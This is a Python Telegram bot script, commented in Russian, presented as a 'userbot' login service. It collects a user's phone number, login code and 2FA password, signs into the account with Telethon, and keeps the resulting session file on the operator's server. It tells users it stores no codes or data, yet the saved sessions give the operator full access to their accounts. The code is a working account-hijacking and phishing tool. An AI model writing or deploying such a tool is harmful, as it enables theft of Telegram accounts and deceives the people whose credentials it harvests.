import os
import asyncio
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# ----------------- Импорт из БД -----------------
from db import add_user, get_user, get_all_users, update_user

# ----------------- Загрузка переменных -----------------
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("W_TOKEN")

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ----------------- Состояния -----------------
ASK_AGREE, ASK_PHONE, WAIT_CODE, WAIT_2FA = range(4)

clients = {}
phones = {}
codes = {}
timeouts = {}


# ----------------- Клавиатура для кода -----------------
def get_code_keyboard():
    rows = [
        ["1", "2", "3"],
        ["4", "5", "6"],
        ["7", "8", "9"],
        ["0"]
    ]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(txt, callback_data=f"code_{txt}") for txt in row]
        for row in rows
    ] + [[InlineKeyboardButton("⌫", callback_data="code_back")]])


# ----------------- /login -----------------
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)

    # Если пользователь уже согласился — пропускаем шаг согласия
    if user and user.agree:
        await update.message.reply_text("Вы уже приняли соглашение. Отправьте номер телефона:")
        kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Отправить номер", request_contact=True)]], resize_keyboard=True)
        await update.message.reply_text("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
        return ASK_PHONE

    # Иначе — показываем соглашение
    text = (
        "⚠️ Внимание! Этот процесс предназначен для входа в ваш Telegram-аккаунт через клиент (userbot).\n"
        "Бот не хранит ваш пароль, код или данные.\n"
        "Используя этот сервис, вы соглашаетесь с пользовательским соглашением.\n\n"
        "Нажмите ✅ Я согласен, чтобы продолжить."
    )
    kb = ReplyKeyboardMarkup([[KeyboardButton("✅ Я согласен")]], resize_keyboard=True)
    await update.message.reply_text(text, reply_markup=kb)
    return ASK_AGREE


# ----------------- Пользователь согласился -----------------
async def agree_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if text != "✅ Я согласен":
        return ASK_AGREE

    # Получаем или создаём пользователя
    user = get_user(user_id)
    if not user:
        add_user(tg_id=user_id, agree=True)
    else:
        update_user(tg_id=user_id, agree=True)

    # Убираем клавиатуру и просим номер
    await update.message.reply_text("Спасибо! Теперь отправьте номер телефона:", reply_markup=ReplyKeyboardRemove())
    kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Отправить номер", request_contact=True)]], resize_keyboard=True)
    await update.message.reply_text("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    return ASK_PHONE


# ----------------- Получаем номер -----------------
async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.contact is None:
        return ASK_PHONE

    phone = update.message.contact.phone_number
    phones[user_id] = phone

    # Удаляем сообщение с контактом
    try:
        await update.message.delete()
    except:
        pass

    await update.effective_chat.send_message("Получен номер. Ожидаю код...", reply_markup=ReplyKeyboardRemove())

    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    client = TelegramClient(session_path, API_ID, API_HASH)
    clients[user_id] = client
    await client.connect()

    try:
        await client.send_code_request(phone)
    except Exception as e:
        await update.effective_chat.send_message(f"Ошибка: {e}")
        return ConversationHandler.END

    codes[user_id] = ""
    timeouts[user_id] = asyncio.get_event_loop().call_later(
        60, lambda: asyncio.create_task(timeout_fail(update))
    )

    await update.effective_chat.send_message("Введите код:", reply_markup=get_code_keyboard())
    return WAIT_CODE


# ----------------- Таймаут 1 минута -----------------
async def timeout_fail(update: Update):
    user_id = update.effective_user.id
    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        del clients[user_id]

    codes.pop(user_id, None)
    phones.pop(user_id, None)
    timeouts.pop(user_id, None)
    await update.effective_chat.send_message("⏳ Время на ввод кода истекло. Попробуйте снова: /login")


# ----------------- Ввод кода -----------------
async def code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    if data == "code_back":
        codes[user_id] = codes[user_id][:-1]
    else:
        digit = data.split("_")[1]
        codes[user_id] += digit

    dots = "●" * len(codes[user_id])
    await query.edit_message_text(f"Введите код:\n{dots}", reply_markup=get_code_keyboard())

    if len(codes[user_id]) == 5:
        return await finish_code(update, context)

    return WAIT_CODE


# ----------------- Завершаем ввод кода -----------------
async def finish_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    code = codes[user_id]
    client = clients[user_id]
    phone = phones[user_id]

    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]

    try:
        await client.sign_in(phone=phone, code=code)
        await client.disconnect()
        await query.edit_message_text("✅ Вход выполнен. Сессия сохранена.")
        return ConversationHandler.END

    except SessionPasswordNeededError:
        await query.edit_message_text("Введите пароль 2FA:")
        return WAIT_2FA
    except PhoneCodeInvalidError:
        codes[user_id] = ""
        await query.edit_message_text("❌ Неверный код. Попробуйте снова:", reply_markup=get_code_keyboard())
        return WAIT_CODE
    except Exception as e:
        await query.edit_message_text(f"Ошибка входа: {e}")
        return ConversationHandler.END


# ----------------- 2FA -----------------
async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = clients[user_id]

    try:
        await client.sign_in(password=password)
        await client.disconnect()
        await update.message.reply_text("✅ Успешный вход. Сессия сохранена.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка 2FA: {e}")

    return ConversationHandler.END


# ----------------- Cancel -----------------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отменено.")
    return ConversationHandler.END


# ----------------- Main -----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("login", login_start)],
        states={
            ASK_AGREE: [MessageHandler(filters.TEXT & ~filters.COMMAND, agree_received)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, phone_received)],
            WAIT_CODE: [CallbackQueryHandler(code_input)],
            WAIT_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(conv)

    print("Bot started.")
    app.run_polling()


if __name__ == "__main__":
    main()